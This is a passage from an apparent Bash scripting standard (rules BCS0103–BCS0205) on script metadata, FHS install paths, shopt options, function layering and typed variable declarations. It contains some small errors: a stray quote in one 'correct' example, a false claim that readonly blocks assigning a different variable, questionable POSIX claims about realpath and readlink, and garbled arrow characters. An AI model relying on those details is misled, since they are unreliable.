| Variable | Purpose | Derivation |
|----------|---------|------------|
| VERSION | Semantic version (Major.Minor.Patch) | Manual assignment |
| SCRIPT_PATH | Absolute canonical path | `$(realpath -- "$0")` |
| SCRIPT_DIR | Directory containing script | `${SCRIPT_PATH%/*}` |
| SCRIPT_NAME | Base filename only | `${SCRIPT_PATH##*/}` |

**Usage examples:**

```bash
# Version display
show_version() { echo "$SCRIPT_NAME $VERSION"; }

# Load libraries relative to script
source "$SCRIPT_DIR"/lib/common.sh

# Error messages
die() { (($# < 2)) || >&2 echo "$SCRIPT_NAME: error: ${*:2}"; exit "${1:-0}"; }

# Help text
show_help() { cat << EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE
EOF
}
```

**Why realpath over readlink:**
- Simpler syntax: No `-e` and `-n` flags needed
- Loadable builtin available for maximum performance
- POSIX compliant (readlink is GNU-specific)
- Fails if file doesn't exist (catches errors early)

```bash
# ✓ Correct - use realpath
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Avoid - readlink requires -en flags
SCRIPT_PATH=$(readlink -en -- "$0")
```

**About SC2155:**

```bash
# shellcheck SC2155 warns about command substitution in declare -r masking return value
# We disable it because:
# 1. realpath failure is acceptable - we WANT early failure if script doesn't exist
# 2. Pattern is concise and immediately makes variable readonly
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
```

**Anti-patterns:**

```bash
# ✗ Wrong - using $0 directly without realpath
SCRIPT_PATH="$0"  # Could be relative path or symlink!

# ✓ Correct
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Wrong - using dirname/basename (external commands)
SCRIPT_DIR=$(dirname "$0")
SCRIPT_NAME=$(basename "$0")

# ✓ Correct - parameter expansion (faster)
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - using PWD for script directory
SCRIPT_DIR=$PWD  # This is CWD, not script location!

# ✗ Wrong - readonly assignment fails
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}  # Can't assign to readonly!

# ✓ Correct - declare -r
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
```

**Edge case: Script in root directory:**

```bash
# If script is /myscript, SCRIPT_DIR becomes empty string
SCRIPT_DIR=${SCRIPT_PATH%/*}
[[ -n "$SCRIPT_DIR" ]] || SCRIPT_DIR='/'
readonly -- SCRIPT_DIR
```

**Edge case: Sourced vs executed:**

```bash
# When sourced, $0 is the calling shell
if [[ "${BASH_SOURCE[0]}" != "$0" ]]; then
  SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
else
  SCRIPT_PATH=$(realpath -- "$0")
fi
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- LOG_FILE="$SCRIPT_DIR"/../logs/"$SCRIPT_NAME".log
declare -- CONFIG_FILE="$SCRIPT_DIR"/../etc/"$SCRIPT_NAME".conf

info() { echo "[$SCRIPT_NAME] $*" | tee -a "$LOG_FILE"; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

show_version() { echo "$SCRIPT_NAME $VERSION"; }

show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -h, --help     Show this help message
  -V, --version  Show version information

Version: $VERSION
Location: $SCRIPT_PATH
EOF
}

load_config() {
  if [[ -f "$CONFIG_FILE" ]]; then
    info "Loading configuration from ${CONFIG_FILE@Q}"
    source "$CONFIG_FILE"
  else
    die 2 "Configuration file not found ${CONFIG_FILE@Q}"
  fi
}

main() {
  info "Starting $SCRIPT_NAME $VERSION"
  load_config
  info 'Processing complete'
}

main "$@"

#fin
```

**Summary:**
- Declare metadata immediately after `shopt` settings
- Use standard names: VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- Use `realpath` to resolve SCRIPT_PATH (canonical BCS approach)
- Derive SCRIPT_DIR/SCRIPT_NAME from SCRIPT_PATH using parameter expansion
- Use `declare -r` for immediate readonly
- Use metadata for resource location, logging, error messages, version display


---


**Rule: BCS0104**

## Filesystem Hierarchy Standard (FHS) Preference

**Follow FHS for scripts that install files or search for resources. FHS enables predictable locations, multi-environment support, and package manager compatibility.**

**Rationale:**
- Predictability: Standard locations (`/usr/local/bin/`, `/usr/share/`)
- Multi-environment: Works in development, local, system, and user installs
- Package manager compatible (apt, yum, pacman)
- Eliminates hardcoded paths; portable across distributions
- Separates executables, data, configuration, and documentation

**FHS Locations:**
| Path | Purpose |
|------|---------|
| `/usr/local/bin/` | User-installed executables (not package-managed) |
| `/usr/local/share/` | Architecture-independent data |
| `/usr/local/lib/` | Libraries and loadable modules |
| `/usr/local/etc/` | Configuration files |
| `/usr/bin/`, `/usr/share/` | Package-managed system files |
| `$HOME/.local/bin/` | User-specific executables |
| `${XDG_DATA_HOME:-$HOME/.local/share}/` | User-specific data |
| `${XDG_CONFIG_HOME:-$HOME/.config}/` | User-specific config |

**FHS Search Pattern (Canonical):**
```bash
find_data_file() {
  local -- script_dir=$1
  local -- filename=$2
  local -a search_paths=(
    "$script_dir"/"$filename"  # Same directory (development)
    /usr/local/share/myapp/"$filename" # Local install
    /usr/share/myapp/"$filename" # System install
    "${XDG_DATA_HOME:-$HOME/.local/share}"/myapp/"$filename"  # User install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; } ||:
  done

  return 1
}
```

**FHS-Compliant Installation Script:**
```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Installation paths (customizable via PREFIX)
declare -- PREFIX=${PREFIX:-/usr/local}
declare -- BIN_DIR="$PREFIX"/bin
declare -- SHARE_DIR="$PREFIX"/share/myapp
declare -- LIB_DIR="$PREFIX"/lib/myapp
declare -- ETC_DIR="$PREFIX"/etc/myapp
declare -- MAN_DIR="$PREFIX"/share/man/man1
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR MAN_DIR

install_files() {
  install -d "$BIN_DIR" "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR" "$MAN_DIR"
  install -m 755 "$SCRIPT_DIR"/myapp "$BIN_DIR"/myapp
  install -m 644 "$SCRIPT_DIR"/data/template.txt "$SHARE_DIR"/template.txt
  install -m 644 "$SCRIPT_DIR"/lib/common.sh "$LIB_DIR"/common.sh
  # Preserve existing config
  if [[ ! -f "$ETC_DIR"/myapp.conf ]]; then
    install -m 644 "$SCRIPT_DIR/myapp.conf.example" "$ETC_DIR/myapp.conf"
  fi
  install -m 644 "$SCRIPT_DIR"/docs/myapp.1 "$MAN_DIR"/myapp.1
  info "Installation complete to $PREFIX"
}

uninstall_files() {
  rm -f "$BIN_DIR"/myapp "$SHARE_DIR"/template.txt "$LIB_DIR"/common.sh "$MAN_DIR"/myapp.1
  rmdir --ignore-fail-on-non-empty "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR"
  info 'Uninstallation complete'
}

main() {
  case "${1:-install}" in
    install)   install_files ;;
    uninstall) uninstall_files ;;
    *)         die 2 "Usage: $SCRIPT_NAME {install|uninstall}" ;;
  esac
}

main "$@"

#fin
```

**Generic FHS Resource Finder:**
```bash
find_resource() {
  local -- type=$1     # 'file' or 'dir'
  local -- name=$2     # Resource name
  local -- install_base="${SCRIPT_DIR%/bin}"/share/myorg/myproject
  local -a search_paths=(
    "$SCRIPT_DIR"                        # Development
    "$install_base"                      # Custom PREFIX
    /usr/local/share/myorg/myproject     # Local install
    /usr/share/myorg/myproject           # System install
  )

  local -- path
  for path in "${search_paths[@]}"; do
    local -- resource="$path/$name"
    case "$type" in
      file) [[ -f "$resource" ]] && { echo "$resource"; return 0; } ;;
      dir)  [[ -d "$resource" ]] && { echo "$resource"; return 0; } ;;
      *)    die 2 "Invalid resource type ${type@Q}" ;;
    esac
  done

  return 1
}
declare -fx find_resource

# Usage:
CONFIG=$(find_resource file config.yml) || die 'Config not found'
DATA_DIR=$(find_resource dir data) || die 'Data directory not found'
```

**XDG Base Directory Variables:**
```bash
declare -- XDG_DATA_HOME=${XDG_DATA_HOME:-$HOME/.local/share}
declare -- XDG_CONFIG_HOME=${XDG_CONFIG_HOME:-$HOME/.config}
declare -- XDG_CACHE_HOME=${XDG_CACHE_HOME:-$HOME/.cache}
declare -- XDG_STATE_HOME=${XDG_STATE_HOME:-$HOME/.local/state}

declare -- USER_DATA_DIR="$XDG_DATA_HOME"/myapp
declare -- USER_CONFIG_DIR="$XDG_CONFIG_HOME"/myapp
install -d "$USER_DATA_DIR" "$USER_CONFIG_DIR"
```

**Makefile Pattern:**
```makefile
PREFIX ?= /usr/local
BINDIR = $(PREFIX)/bin
SHAREDIR = $(PREFIX)/share/myapp

install:
	install -d $(BINDIR) $(SHAREDIR)
	install -m 755 myapp $(BINDIR)/myapp
	install -m 644 data/template.txt $(SHAREDIR)/template.txt

# Usage: make install | make PREFIX=/usr install | make PREFIX=$HOME/.local install
```

**Anti-patterns:**
```bash
# ✗ Wrong - hardcoded absolute path
data_file=/home/user/projects/myapp/data/template.txt
# ✓ Correct - FHS search pattern
data_file=$(find_data_file template.txt)

# ✗ Wrong - assuming specific install location
source /usr/local/lib/myapp/common.sh
# ✓ Correct - search multiple FHS locations
load_library common.sh

# ✗ Wrong - using relative paths from CWD
source ../lib/common.sh  # Breaks when run from different directory
# ✓ Correct - paths relative to script location
source "$SCRIPT_DIR"/../lib/common.sh

# ✗ Wrong - not supporting PREFIX customization
BIN_DIR=/usr/local/bin  # Hardcoded
# ✓ Correct - respect PREFIX environment variable
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin"

# ✗ Wrong - overwriting user configuration on upgrade
install myapp.conf "$PREFIX/etc/myapp/myapp.conf"
# ✓ Correct - preserve existing config
[[ -f "$PREFIX/etc/myapp/myapp.conf" ]] || \
  install myapp.conf.example "$PREFIX/etc/myapp/myapp.conf"
```

**Edge Cases:**

**1. PREFIX with trailing slash:**
```bash
PREFIX=${PREFIX:-/usr/local}
PREFIX=${PREFIX%/}  # Remove trailing slash if present
BIN_DIR="$PREFIX"/bin
```

**2. User install without sudo:**
```bash
if [[ ! -w "$PREFIX" ]]; then
  warn "No write permission to ${PREFIX@Q}"
  info "Try: PREFIX=\$HOME/.local make install"
  die 5 'Permission denied'
fi
```

**3. Symlink resolution:**
```bash
# realpath resolves symlinks - SCRIPT_DIR points to actual install location
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
```

**When NOT to use FHS:**
- Single-user scripts
- Project-specific tools (build scripts, test runners)
- Container applications (Docker often uses `/app`)
- Embedded systems with custom layouts

**Summary:** FHS makes scripts portable, predictable, and package-manager compatible. Use PREFIX for custom installs, search multiple locations, separate file types by hierarchy, support XDG for user files, preserve user config on upgrades.


---


**Rule: BCS0105**

## shopt

**Recommended settings:**

```bash
shopt -s inherit_errexit  # Critical: makes set -e work in subshells
shopt -s shift_verbose    # Catches shift errors when no arguments remain
shopt -s extglob          # Enables extended glob patterns like !(*.txt)

# CHOOSE ONE:
shopt -s nullglob   # For arrays/loops: unmatched globs �' empty
shopt -s failglob   # For strict scripts: unmatched globs �' error

# OPTIONAL:
shopt -s globstar   # Enable ** for recursive matching (slow on deep trees)
```

**Rationale:**

**`inherit_errexit` (CRITICAL):** Without it, `set -e` does NOT apply inside command substitutions:
```bash
set -e  # Without inherit_errexit
result=$(false)  # This does NOT exit the script!
echo "Still running"  # This executes

# With inherit_errexit
shopt -s inherit_errexit
result=$(false)  # Script exits here as expected
```

**`shift_verbose`:** Prints error when shift fails instead of silent continue:
```bash
shopt -s shift_verbose
shift  # If no arguments: "bash: shift: shift count must be <= $#"
```

**`extglob`:** Enables `?(pat)`, `*(pat)`, `+(pat)`, `@(pat)`, `!(pat)`:
```bash
shopt -s extglob
rm !(*.txt)                          # Delete everything EXCEPT .txt
cp *.@(jpg|png|gif) /destination/    # Multiple extensions
[[ $input == +([0-9]) ]] && echo 'Number'
```

**`nullglob` vs `failglob`:**

`nullglob` - unmatched glob expands to empty (for loops/arrays):
```bash
shopt -s nullglob
for file in *.txt; do  # No .txt files �' loop never executes
  echo "$file"
done
files=(*.log)  # No .log files �' files=() (empty array)
```

`failglob` - unmatched glob causes error (strict scripts):
```bash
shopt -s failglob
cat *.conf  # No .conf files: "bash: no match: *.conf" (exits with set -e)
```

**Anti-pattern - default behavior without nullglob/failglob:**
```bash
# ✗ Dangerous default behavior
for file in *.txt; do  # No .txt files �' $file = literal "*.txt"
  rm "$file"  # Tries to delete file named "*.txt"!
done
```

**`globstar`:** Enables `**` for recursive matching:
```bash
shopt -s globstar
for script in **/*.sh; do
  shellcheck "$script"
done
```

**Typical configuration:**
```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

**When NOT to use:**
- Interactive scripts (may want lenient behavior)
- Legacy compatibility (older bash versions)
- Performance-critical loops (`globstar` slow on large trees)


---


**Rule: BCS0106**

## File Extensions

- **Executables**: Use `.sh` extension or no extension
- **Libraries**: Must have `.sh` extension; should not be executable
- **Dual-purpose scripts**: Can use `.sh` or no extension
- **PATH-available executables**: Always omit extension


---


**Rule: BCS0107**

## Function Organization

**Organize functions bottom-up: lowest-level primitives first (messaging, utilities), then composition layers, ending with `main()` as the highest-level orchestrator.**

**Rationale:**
- **No Forward References**: Bash reads top-to-bottom; functions must exist before being called
- **Readability**: Primitives first, then compositions - readers understand dependencies immediately
- **Testability**: Low-level functions can be tested independently before testing compositions
- **Maintainability**: Clear dependency hierarchy shows where to add new functions

**Standard 7-layer organization:**

```bash
#!/bin/bash
set -euo pipefail

# 1. Messaging functions (lowest level - used by everything)
_msg() { ... }
success() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# 2. Documentation functions (no dependencies)
show_help() { ... }

# 3. Helper/utility functions (used by validation and business logic)
yn() { ... }
noarg() { ... }

# 4. Validation functions (check prerequisites, dependencies)
check_root() { ... }
check_prerequisites() { ... }

# 5. Business logic functions (domain-specific operations)
build_standalone() { ... }
install_standalone() { ... }

# 6. Orchestration/flow functions
show_completion_message() { ... }
uninstall_files() { ... }

# 7. Main function (highest level - orchestrates everything)
main() {
  check_root
  check_prerequisites
  if ((UNINSTALL)); then
    uninstall_files
    return 0
  fi
  build_standalone
  install_standalone
  show_completion_message
}

main "$@"
#fin
```

**Dependency flow (each layer can only call layers above it):**

```
Top of file
     ↓
[Layer 1: Messaging] ← Can call nothing (primitives)
     ↓
[Layer 2: Documentation] ← Can call Layer 1
     ↓
[Layer 3: Utilities] ← Can call Layers 1-2
     ↓
[Layer 4: Validation] ← Can call Layers 1-3
     ↓
[Layer 5: Business Logic] ← Can call Layers 1-4
     ↓
[Layer 6: Orchestration] ← Can call Layers 1-5
     ↓
[Layer 7: main()] ← Can call all layers
     ↓
main "$@" invocation
#fin
```

**Layer descriptions:**

| Layer | Functions | Purpose | Used By |
|-------|-----------|---------|---------|
| 1 | `_msg()`, `info()`, `warn()`, `error()`, `die()`, `success()` | Output messages | Everything |
| 2 | `show_help()`, `show_version()` | Display help/usage | Argument parsing, main() |
| 3 | `yn()`, `noarg()`, `trim()` | Generic utilities | Validation, business logic |
| 4 | `check_root()`, `check_prerequisites()`, `validate_input()` | Verify preconditions | main(), business logic |
| 5 | `build_project()`, `process_file()`, `deploy_app()` | Core functionality | Orchestration, main() |
| 6 | `run_build_phase()`, `run_deploy_phase()`, `cleanup()` | Coordinate business logic | main() |
| 7 | `main()` | Top-level script flow | Script invocation |

**Anti-patterns:**

```bash
# ✗ Wrong - main() at the top (forward references required)
main() {
  build_project  # build_project not defined yet!
  deploy_app     # deploy_app not defined yet!
}
build_project() { ... }
deploy_app() { ... }

# ✓ Correct - main() at bottom
build_project() { ... }
deploy_app() { ... }
main() {
  build_project
  deploy_app
}

# ✗ Wrong - business logic before utilities it calls
process_file() {
  validate_input "$1"  # validate_input not defined yet!
}
validate_input() { ... }

# ✓ Correct - utilities before business logic
validate_input() { ... }
process_file() {
  validate_input "$1"
}

# ✗ Wrong - messaging functions scattered throughout
info() { ... }
build() { ... }
warn() { ... }
deploy() { ... }
error() { ... }

# ✓ Correct - all messaging together at top
info() { ... }
warn() { ... }
error() { ... }
die() { ... }
build() { ... }
deploy() { ... }

# ✗ Wrong - circular dependencies (A calls B, B calls A)
function_a() { function_b; }
function_b() { function_a; }  # Circular!

# ✓ Correct - extract common logic to lower-level function
common_logic() { ... }
function_a() { common_logic; ... }
function_b() { common_logic; ... }
```

**Within-layer ordering guidelines:**

- **Layer 1 (Messaging)**: Order by severity: `_msg()` �' `info()` �' `success()` �' `debug()` �' `warn()` �' `error()` �' `die()`
- **Layer 3 (Helpers)**: Alphabetically or by frequency of use
- **Layer 4 (Validation)**: By execution sequence (functions called early first)
- **Layer 5 (Business Logic)**: By logical workflow sequence

**Edge cases:**

**1. Circular dependencies** - Extract common logic:
```bash
shared_validation() { ... }  # Common code
function_a() { shared_validation; ... }
function_b() { shared_validation; ... }
```

**2. Sourced libraries** - Place after messaging layer:
```bash
info() { ... }
warn() { ... }
source "$SCRIPT_DIR/lib/common.sh"  # After messaging
validate_email() { ... }  # Can use both messaging AND library
```

**3. Private functions** - Place in same layer as public functions:
```bash
_msg() { ... }  # Private core utility
info() { >&2 _msg "$@"; }  # Public wrapper
```

**Key principle:** Bottom-up organization mirrors how programmers think: understand primitives first, then compositions. This eliminates forward reference issues and makes scripts immediately understandable.


---


**Rule: BCS0200**

# Variable Declarations & Constants

Explicit variable declaration practices with type hints for clarity and safety. Covers type-specific declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`), scoping rules (global vs local), naming conventions (UPPER_CASE constants, lower_case variables), readonly patterns (individual and group), boolean flags using integers, and derived variable patterns. These practices ensure predictable behavior and prevent common shell scripting errors.


---


**Rule: BCS0201**

## Type-Specific Declarations

**Always use explicit type declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`) to make variable intent clear and enable type-safe operations.**

**Rationale:**
- Type Safety: Integer declarations (`-i`) enforce numeric operations, catch non-numeric assignments
- Intent Documentation: Types serve as inline documentation showing variable usage
- Array Safety: Prevents accidental scalar assignment breaking array operations
- Performance: Type-specific operations are faster than string-based operations
- Error Prevention: Type mismatches caught early rather than causing subtle bugs

**All declaration types:**

**1. Integer variables (`declare -i`)**

```bash
declare -i count=0
declare -i exit_code=1
declare -i port=8080

# Automatic arithmetic evaluation
count=count+1  # Same as: ((count+=1))
count='5 + 3'  # Evaluates to 8, not string "5 + 3"

# Type enforcement
count='abc'  # Evaluates to 0 (non-numeric becomes 0)
```

**Use for:** Counters, loop indices, exit codes, port numbers, numeric flags, any variable in arithmetic operations.

> **See Also:** BCS0705 for using declared integers in arithmetic comparisons with `(())` instead of `[[ ... -eq ... ]]`

**2. String variables (`declare --`, `local --`)**

```bash
declare -- filename=data.txt
declare -- user_input=''
declare -- config_path=/etc/app/config.conf

# `--` prevents option injection if variable name starts with -
declare -- var_name='-weird'  # Without --, interpreted as option
```

**Use for:** File paths, user input, configuration values, any text data. Default choice for most variables.

**3. Indexed arrays (`declare -a`)**

```bash
declare -a files=()
declare -a args=(one two three)

files+=('file1.txt')
files+=('file2.txt')

echo "${files[0]}"   # file1.txt
echo "${files[@]}"   # All elements
echo "${#files[@]}"  # Count: 2

for file in "${files[@]}"; do
  process "$file"
done
```

**Use for:** Lists of items (files, arguments, options), command arrays, any sequential collection.

**4. Associative arrays (`declare -A`)**

```bash
declare -A config=(
  [app_name]=myapp
  [app_port]=8080
  [app_host]=localhost
)

declare -A user_data=()
user_data[name]=Alice
user_data[email]='alice@example.com'

echo "${config[app_name]}"  # myapp
echo "${!config[@]}"        # All keys
echo "${config[@]}"         # All values

# Check if key exists
if [[ -v "config[app_port]" ]]; then
  echo "Port configured: ${config[app_port]}"
fi

for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done
```

**Use for:** Configuration data (key-value pairs), dynamic function dispatch, caching/memoization.

**5. Read-only constants (`readonly --`)**

```bash
readonly -- VERSION=1.0.0
readonly -i MAX_RETRIES=3
readonly -a ALLOWED_ACTIONS=(start stop restart status)

VERSION=2.0.0  # bash: VERSION: readonly variable
```

**Use for:** VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME, configuration values that shouldn't change, magic numbers/strings.

**6. Local variables in functions (`local --`)**

**MANDATORY: Always use `--` separator with `local` declarations.** Prevents option injection if variable name or value starts with `-`.

```bash
# ✓ CORRECT - always use `--` separator
process_file() {
  local -- filename=$1
  local -i line_count
  local -a lines

  line_count=$(wc -l < "$filename")
  readarray -t lines < "$filename"
  echo "Processed $line_count lines"
}

# ✗ WRONG - missing `--` separator
process_file_bad() {
  local filename=$1    # If $1 is "-n", behavior changes!
  local name value     # Should be: local -- name value
}
```

**Use for:** ALL function parameters, ALL temporary variables in functions, variables that shouldn't leak to global scope.

**Combining type and scope:**

```bash
declare -i GLOBAL_COUNT=0

function count_files() {
  local -- dir=$1
  local -i file_count=0
  local -a files

  files=("$dir"/*)

  for file in "${files[@]}"; do
    [[ -f "$file" ]] && file_count+=1 ||:
  done

  echo "$file_count"
}

declare -a PROCESSED_FILES=()
declare -A FILE_STATUS=()
readonly -- CONFIG_FILE=config.conf
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - no type declaration (intent unclear)
count=0
files=()

# ✓ Correct - explicit type declarations
declare -i count=0
declare -a files=()

# ✗ Wrong - using strings for numeric operations
max_retries='3'
attempts='0'
if [[ "$attempts" -lt "$max_retries" ]]; then  # String comparison!

# ✓ Correct - use integers for numeric operations
declare -i max_retries=3
declare -i attempts=0
if ((attempts < max_retries)); then  # Numeric comparison

# ✗ Wrong - forgetting -A for associative arrays
declare CONFIG  # Creates scalar, not associative array
CONFIG[key]='value'  # Treats 'key' as 0, creates indexed array!

# ✓ Correct - explicit associative array declaration
declare -A CONFIG=()
CONFIG[key]='value'

# ✗ Wrong - global variables in functions
process_data() {
  temp_var=$1  # Global variable leak!
}

# ✓ Correct - local variables in functions
process_data() {
  local -- temp_var=$1
}

# ✗ Wrong - scalar assignment to array variable
declare -a files=()
files=file.txt  # Overwrites array with scalar!

# ✓ Correct - array assignment
declare -a files=()
files=(file.txt)   # Array with one element
files+=(file.txt)  # Append to array
```

**Edge cases:**

**1. Integer overflow:**

```bash
declare -i big_number=9223372036854775807  # Max 64-bit signed int
big_number+=1
echo "$big_number"  # Wraps to negative!

# For very large numbers, use string or bc
declare -- big='99999999999999999999'
result=$(bc <<< "$big + 1")
```

**2. Associative array requires Bash 4.0+:**

```bash
if ((BASH_VERSINFO[0] < 4)); then
  die 1 'Associative arrays require Bash 4.0+'
fi
declare -A config=()
```

**3. Array assignment syntax:**

```bash
declare -a arr1=()           # Empty array
declare -a arr2=('a' 'b')    # Array with 2 elements
declare -a arr3              # Declare without initialization

declare -a arr4='string'     # arr4 is string 'string', not array!
declare -a arr5=('string')   # Correct: Array with one element
```

**4. Nameref variables (Bash 4.3+):**

```bash
modify_array() {
  local -n arr_ref=$1  # Nameref to array
  arr_ref+=('new element')
}

declare -a my_array=('a' 'b')
modify_array my_array  # Pass name, not value
echo "${my_array[@]}"  # Output: a b new element
```

**Summary:**
- **`declare -i`**: integers (counters, exit codes, ports)
- **`declare --`**: strings (paths, text, user input)
- **`declare -a`**: indexed arrays (lists, sequences)
- **`declare -A`**: associative arrays (key-value maps, configs)
- **`readonly --`**: constants that shouldn't change
- **`local`**: ALL variables in functions (prevent global leaks)
- **Combine modifiers**: `local -i`, `local -a`, `readonly -A`
- **Always use `--`**: separator prevents option injection

**Key principle:** Explicit type declarations serve as inline documentation and enable type checking. `declare -i count=0` tells both Bash and readers: "This variable holds an integer for arithmetic operations."


---


**Rule: BCS0202**

## Variable Scoping

Declare function-specific variables as `local` to prevent namespace pollution and side effects.

```bash
# Global variables - declare at top
declare -i VERBOSE=1 PROMPT=1

# Function variables - always use local
main() {
  local -a add_specs=()      # Local array
  local -i max_depth=3       # Local integer
  local -- path              # Local string
  local -- dir
  dir=$(dirname -- "$name")
}
```

**Rationale:** Without `local`, function variables: overwrite globals with same name, persist after return, break recursive calls.

**Anti-patterns:**
```bash
# ✗ Wrong - no local declaration
process_file() {
  file=$1  # Overwrites any global $file variable!
}

# ✓ Correct - local declaration
process_file() {
  local -- file=$1  # Scoped to this function only
}
```

**Recursive function gotcha:**
```bash
# ✗ Wrong - global resets on each recursive call
count_files() {
  total=0
  for file in "$1"/*; do total+=1; done
  echo "$total"
}

# ✓ Correct - each invocation gets its own total
count_files() {
  local -i total=0
  for file in "$1"/*; do total+=1; done
  echo "$total"
}
```


---


**Rule: BCS0203**

## Naming Conventions

| Type | Convention | Example |
|------|------------|---------|
| Constants | UPPER_CASE | `readonly MAX_RETRIES=3` |
| Global variables | UPPER_CASE or CamelCase | `VERBOSE=1` or `ConfigFile='/etc/app.conf'` |
| Local variables | lower_case with underscores | `local file_count=0` |
| Internal/private functions | prefix with _ | `_validate_input()` |
| Environment variables | UPPER_CASE with underscores | `export DATABASE_URL` |

**Examples:**
```bash
# Constants
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_CONNECTIONS=100

# Global variables
declare -i VERBOSE=1
declare -- ConfigFile=/etc/myapp.conf

# Local variables
process_data() {
  local -i line_count=0
  local -- temp_file
  local -- CurrentSection  # CamelCase for important variable
}

# Private functions
_internal_helper() {
  # Used only by other functions in this script
}
```

**Rationale:**
- UPPER_CASE for globals/constants: Visible as script-wide scope, matches shell conventions
- lower_case for locals: Distinguishes from globals, prevents accidental shadowing
- Underscore prefix for private functions: Signals internal use, prevents namespace conflicts
- Avoid lowercase single-letter names (`a`, `b`, `n`) and shell reserved names (`PATH`, `HOME`, `USER`)


---


**Rule: BCS0204**

## Constants and Environment Variables

**Constants (readonly):**
```bash
# Use readonly for values that never change
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_RETRIES=3
declare -r CONFIG_DIR=/etc/myapp

# Group readonly declarations
VERSION=1.0.0
AUTHOR='John Doe'
LICENSE=GPL-3
readonly -- VERSION AUTHOR LICENSE
```

**Environment variables (export):**
```bash
# Use declare -x (or export) for variables passed to child processes
declare -x ORACLE_SID=PROD
declare -x DATABASE_URL='postgresql://localhost/mydb'

# Alternative syntax
export LOG_LEVEL=DEBUG
export TEMP_DIR=/tmp/myapp
```

**Rationale:**

- `readonly`: Script metadata (VERSION, AUTHOR), configuration paths, derived constants. Prevents modification, signals intent.
- `declare -x`/`export`: Values for child processes, environment config (DATABASE_URL, API_KEY), settings for subshells.

| Feature | `readonly` | `declare -x` / `export` |
|---------|-----------|------------------------|
| Prevents modification | ✓ Yes | ✗ No |
| Available in subprocesses | ✗ No | ✓ Yes |
| Can be changed later | ✗ Never | ✓ Yes |
| Use case | Constants | Environment config |

**Combining both (readonly + export):**
```bash
# Make a constant that is also exported to child processes
declare -rx BUILD_ENV=production
declare -rix MAX_CONNECTIONS=100

# Or in two steps
declare -x DATABASE_URL='postgresql://prod-db/app'
readonly -- DATABASE_URL
```

**Anti-patterns:**

```bash
# ✗ Wrong - exporting constants unnecessarily
export MAX_RETRIES=3  # Child processes don't need this

# ✓ Correct - only make it readonly
readonly -- MAX_RETRIES=3

# ✗ Wrong - not making true constants readonly
CONFIG_FILE=/etc/app.conf  # Could be accidentally modified later

# ✓ Correct - protect against modification
readonly -- CONFIG_FILE=/etc/app.conf

# ✗ Wrong - making user-configurable variables readonly too early
readonly -- OUTPUT_DIR="$HOME"/output  # Can't be overridden by user!

# ✓ Correct - allow override, then make readonly
OUTPUT_DIR=${OUTPUT_DIR:-$HOME/output}
readonly -- OUTPUT_DIR
```

**Complete example:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Script constants (not exported)
readonly -- SCRIPT_VERSION=2.1.0
readonly -- MAX_FILE_SIZE=$((100 * 1024 * 1024))  # 100MB

# Environment variables for child processes (exported)
declare -x LOG_LEVEL=${LOG_LEVEL:-INFO}
declare -x TEMP_DIR=${TMPDIR:-/tmp}

# Combined: readonly + exported
declare -rx BUILD_ENV=production

# Derived constants (readonly)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```


---


**Rule: BCS0205**

## Readonly After Group

**Declare multiple readonly variables first with their values, then make them all readonly in a single statement.**

**Rationale:**
- Prevents assignment errors (cannot assign to already-readonly variable)
- Visual grouping of related constants as logical unit
- Clear immutability contract; explicit protection phase
- Easy maintenance; if uninitialized variable in readonly list, script fails explicitly

**Three-Step Progressive Readonly Workflow:**

For variables finalized after argument parsing:

**Step 1 - Declare with defaults:**
```bash
declare -i VERBOSE=0 DRY_RUN=0
declare -- OUTPUT_FILE='' PREFIX=/usr/local
```

**Step 2 - Parse and modify in main():**
```bash
main() {
  while (($#)); do case $1 in
    -v) VERBOSE+=1 ;;
